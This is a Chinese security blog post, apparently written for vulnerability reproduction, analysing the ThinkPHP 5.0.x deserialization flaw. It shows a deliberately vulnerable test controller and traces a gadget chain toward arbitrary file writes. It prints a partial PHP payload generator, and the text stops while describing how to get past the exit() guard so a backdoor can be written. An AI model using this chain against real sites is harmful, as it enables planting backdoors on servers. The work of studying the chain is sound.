@@ -1,0 +1,556 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"zls1793.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="漏洞环境: 版本: 12ThinkPHP V5.0.24php v7.1.9 测试代码: application目录下新建一个一个模块test在controller文件夹内创建Test.php内容如下 123456789101112131415&lt;?php#命名空间app默认位于applicationnamespace app\test\controller;class Test&#123;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="thinkphp-5.0.*-反序列化漏洞">
+<meta property="og:url" content="https://zls1793.github.io/2024/01/19/thinkphp-5.0.-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="LtmThink">
+<meta property="og:description" content="漏洞环境: 版本: 12ThinkPHP V5.0.24php v7.1.9 测试代码: application目录下新建一个一个模块test在controller文件夹内创建Test.php内容如下 123456789101112131415&lt;?php#命名空间app默认位于applicationnamespace app\test\controller;class Test&#123;">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401191432759.png">
+<meta property="og:image" content="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401191432760.png">
+<meta property="og:image" content="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401191432761.png">
+<meta property="og:image" content="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401191432762.png">
+<meta property="og:image" content="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401191432763.png">
+<meta property="og:image" content="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401191432764.png">
+<meta property="og:image" content="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401191432765.png">
+<meta property="og:image" content="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401191432766.png">
+<meta property="og:image" content="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401191432768.png">
+<meta property="og:image" content="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401191432763.png">
+<meta property="og:image" content="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401191432769.png">
+<meta property="og:image" content="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401191432770.png">
+<meta property="og:image" content="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401191432771.png">
+<meta property="og:image" content="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401191432772.png">
+<meta property="og:image" content="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401191432773.png">
+<meta property="og:image" content="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401191432774.png">
+<meta property="og:image" content="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401191432775.png">
+<meta property="og:image" content="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401191432776.png">
+<meta property="og:image" content="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401191432777.png">
+<meta property="og:image" content="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401191432778.png">
+<meta property="og:image" content="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401191432779.png">
+<meta property="og:image" content="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401191432780.png">
+<meta property="article:published_time" content="2024-01-18T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-01-19T06:37:15.213Z">
+<meta property="article:author" content="LtmThink">
+<meta property="article:tag" content="thinkphp漏洞">
+<meta property="article:tag" content="php">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401191432759.png">
+
+<link rel="canonical" href="https://zls1793.github.io/2024/01/19/thinkphp-5.0.-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>thinkphp-5.0.*-反序列化漏洞 | LtmThink</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+	<a target="_blank" rel="noopener" href="https://github.com/zls1793" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">LtmThink</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">LtmThink的个人博客</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://zls1793.github.io/2024/01/19/thinkphp-5.0.-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="LtmThink">
+      <meta itemprop="description" content="LtmThink的个人博客">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="LtmThink">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          thinkphp-5.0.*-反序列化漏洞
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2024-01-19 00:00:00 / 修改时间：14:37:15" itemprop="dateCreated datePublished" datetime="2024-01-19T00:00:00+08:00">2024-01-19</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/cms%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" itemprop="url" rel="index"><span itemprop="name">cms漏洞复现</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/cms%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/thinkphp/" itemprop="url" rel="index"><span itemprop="name">thinkphp</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="漏洞环境">漏洞环境:</h2>
+<p>版本:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ThinkPHP V5.0.24</span><br><span class="line">php v7.1.9</span><br></pre></td></tr></table></figure>
+<p>测试代码:</p>
+<p>application目录下新建一个一个模块test在controller文件夹内创建Test.php内容如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">#命名空间app默认位于application</span><br><span class="line">namespace app\test\controller;</span><br><span class="line"></span><br><span class="line">class Test</span><br><span class="line">&#123;</span><br><span class="line">	//访问http://localhost/tp5.0/public/index.php/test/test/hello</span><br><span class="line">	//或者传递参数访问http://localhost/tp5.0/public/index.php/test/test/hello/pass/参数</span><br><span class="line">    public function hello($pass = &#x27;pass&#x27;)</span><br><span class="line">    &#123;</span><br><span class="line">        unserialize(base64_decode($pass));</span><br><span class="line">        return &#x27;hello&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="漏洞分析">漏洞分析:</h2>
+<p>类似thinkphp-5.1.*的反序列化漏洞,thinkphp-5.0.*-反序列化漏洞的入口点是</p>
+<p>tp5.0\thinkphp\library\think\process\pipes\Windows.php的__destruct()方法</p>
+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401191432759.png" alt="image-20240118145113219"></p>
+<p>同样进入removeFiles(),可用看到这里同样是有反序列化+任意文件删除的漏洞组合的(相关poc见我写的thinkphp-5.1.*-反序列化漏洞分析)。</p>
+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401191432760.png" alt="image-20240118145208238"></p>
+<p>我们通过file_exists是可以触发<code>__toString</code>的,这里我们通过全局搜索可以发现\tp5.0\thinkphp\library\think\Model.php 的抽象类Model存在<code>__toString</code>方法。因为Model是抽象类,我们无法直接实例化,于是搜索继承Model的类,我们发现Pivot类继承了Model。以Pivot类为跳板通过file_exists(new Pivot)的形式我们就可以调用<code>__toString</code>方法了。</p>
+<p>我们来看<code>__toString</code>方法</p>
+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401191432761.png" alt="image-20240118150100331"></p>
+<p>进入toJson()</p>
+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401191432762.png" alt="image-20240118150115854"></p>
+<p>接着进入toArray()。我们在其912行看到<code>$value-&gt;getAttr($attr)</code>,在这里我们需要$value成为类Output,这样就可以触发Output的<code>__call()</code>方法。</p>
+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401191432763.png" alt="image-20240118150324277"></p>
+<p>我们查看getRelationData(),发现需要满足三个条件即可使得<code>$value</code>可控,一眼看过去第一个条件<code>$this-&gt;parent</code>我们可以控制。</p>
+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401191432764.png" alt="image-20240118171609516"></p>
+<p>查看isSelfRelation(),显然$this-&gt;selfRelation我们可以控制,所以第二个条件<code>!$modelRelation-&gt;isSelfRelation()</code>我们可以控制</p>
+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401191432765.png" alt="image-20240118171834387"></p>
+<p>第三个条件<code>get_class($modelRelation-&gt;getModel()) == get_class($this-&gt;parent))</code>需要我们使得<code>get_class($modelRelation-&gt;getModel())</code>的结果是Output对象。我们进入getModel()查看,可以发现这里调用了<code>$this-&gt;query</code>的<code>getModel()</code>方法,<code>$this-&gt;query</code>我们是可控的。</p>
+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401191432766.png" alt="image-20240118172843427"></p>
+<p>继续深入<code>getModel()</code>方法,我们发现Query类存在<code>getModel()</code>方法,<code>$this-&gt;model</code>我们也可以控制的,所以我们需要使得<code>$this-&gt;query</code>为Query对象,Query对象的<code>$this-&gt;model</code>为output对象。这样就可以通过第三个条件的验证了。</p>
+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401191432768.png" alt="image-20240118173451138"></p>
+<p>因为Relation是抽象类那么要使得<code>$this-&gt;query</code>为Query对象,我们就要寻找一个继承Relation的类。考虑到toArray()方法第904行的验证我们还需要这个类含有getBindAttr()方法</p>
+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401191432763.png" alt="image-20240118150324277"></p>
+<p>通过全局搜索我们可以找到这么一个类HasOne。HasOne继承自OneToOne而OneToOne则继承自Relation。所以HasOne满足我们的要求。</p>
+<p>现在我们只需要使得<code>$modelRelation</code>为HasOne对象。从第901行我们可以知道通过调用<code>this-&gt;$relation</code>方法获得的<code>$modelRelation</code>。而<code>$relation</code>是通过<code>$name</code>得到的,<code>$name</code>可控。所以我们只需在Model抽象类中找到一个方法可以返回一个HasOne对象即可。<code>$this-&gt;error</code>可控,getError方法满足我们的要求。</p>
+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401191432769.png" alt="image-20240118183100185"></p>
+<p>所以到目前为止我们构造的反序列化链条如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">Pivot</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Windows</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;files = [<span class="keyword">new</span> <span class="title class_">Pivot</span>()]; <span class="comment">//$file =&gt; /think/Model的子类new Pivot(); Model是抽象类</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">console</span>\<span class="title class_">Output</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">relation</span>\<span class="title">HasOne</span>;</span><br><span class="line">    <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$append</span> = [];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$error</span> = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$parent</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="built_in">parent</span> = <span class="keyword">new</span> <span class="title class_">Output</span>();  <span class="comment">//$this-&gt;parent=&gt; think\console\Output;</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;append = <span class="keyword">array</span>(<span class="string">&quot;xxx&quot;</span>=&gt;<span class="string">&quot;getError&quot;</span>);     <span class="comment">//调用getError 返回this-&gt;error</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;error = <span class="keyword">new</span> <span class="title class_">HasOne</span>();               <span class="comment">// $this-&gt;error 要为 relation类的子类，并且也是OnetoOne类的子类==&gt;&gt;HasOne</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">Model</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">relation</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">HasOne</span> <span class="title class_">extends</span> <span class="title class_">OneToOne</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">relation</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">db</span>\<span class="title class_">Query</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">OneToOne</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$selfRelation</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$bindAttr</span> = [];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$query</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;selfRelation = <span class="number">0</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;query = <span class="keyword">new</span> <span class="title class_">Query</span>();  </span><br><span class="line">            <span class="variable language_">$this</span>-&gt;bindAttr = [<span class="string">&#x27;xxx&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">db</span> &#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">console</span>\<span class="title class_">Output</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Query</span> </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$model</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;model = <span class="keyword">new</span> <span class="title class_">Output</span>(); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">console</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">session</span>\<span class="title class_">driver</span>\<span class="title class_">Memcached</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Output</span></span>&#123;</span><br><span class="line">    <span class="comment">//待构造</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line"><span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>\<span class="title class_">Windows</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Windows</span>()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>接下来我们分析Output类的__call方法,我们可以看到其调用了Output类的block方法</p>
+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401191432770.png" alt="image-20240118183443746"></p>
+<p>查看block方法,发现其继续调用writeln方法</p>
+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401191432771.png" alt="image-20240118183541410"></p>
+<p>继续查看writeln方法,发现其调用了write方法</p>
+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401191432772.png" alt="image-20240118183620984"></p>
+<p>继续追踪write方法,发现其调用了<code>$this-&gt;handle</code>的write的方法,而<code>$this-&gt;handle</code>我们是可以控制的</p>
+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401191432773.png" alt="image-20240118183654591"></p>
+<p>我们全局搜索有write方法的类发现文件<code>\tp5.0\thinkphp\library\think\session\driver\Memcached.php</code>的Memcached类存在write方法,该方法会调用<code>$this-&gt;handler</code>的set方法,其中<code>$this-&gt;handler</code>我们是可以控制的。</p>
+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401191432774.png" alt="image-20240118183822663"></p>
+<p>同理我们继续全局搜索含有set方法的类,在File类中我们可以发现set方法,并且可以通过set方法写入文件</p>
+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401191432775.png" alt="image-20240118184212344"></p>
+<p>但是通过Memcached类传入的<code>$name</code>我们只能部分控制,而<code>$data</code>却完全不受我们控制。这样写入文件是没有意义的。</p>
+<p>为解决这一问题我们关注到第161行的setTagItem函数,我们进入该函数,发现再次调用了set方法写入文件内容,而这一次文件的两个参数我们都可以在一定程度上控制了。</p>
+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401191432776.png" alt="image-20240118184855983"></p>
+<p>但是这样还不够虽然我们可以控制$value使其含有php代码,但是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$data   = &quot;&lt;?php\n//&quot; . sprintf(&#x27;%012d&#x27;, $expire) . &quot;\n exit();?&gt;\n&quot; . $data;</span><br></pre></td></tr></table></figure>
+<p>会使得生成的文件没有执行到我们写的后门代码片段就被exit()终止。事实上我们可以通过php伪协议将前面的代码给转换掉。我们先看到看set()获得文件名的方法getCacheKey()。这个方法通过拼接<code>$this-&gt;options['path']</code>生成文件名,而<code>$this-&gt;options['path']</code>是我们可以控制的。</p>
